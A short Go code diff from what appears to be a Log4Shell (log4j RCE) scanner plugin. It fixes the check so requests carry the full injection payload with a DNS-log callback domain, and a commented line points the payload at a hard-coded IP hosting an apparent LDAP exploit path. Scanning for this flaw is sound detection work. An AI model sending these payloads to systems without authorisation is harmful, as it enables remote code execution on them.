@@ -103,7 +103,7 @@ func (d *log4jRCE2) Check(URL string, meta plugin.TaskMeta) bool {
 	for _, payload := range payloads {
 		var request *http.Request
 		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
-		request, _ = http.NewRequest("GET", URL+"/"+payload, nil)
+		request, _ = http.NewRequest("GET", URL+"/"+fullPayload, nil)
 		_, _ = util.RequestDo(request, false)
 		//fullPayload = fmt.Sprintf("%s134.175.244.170:1389/exp8/%s}", payload, domain)
 		for _, reqPath := range reqPaths {
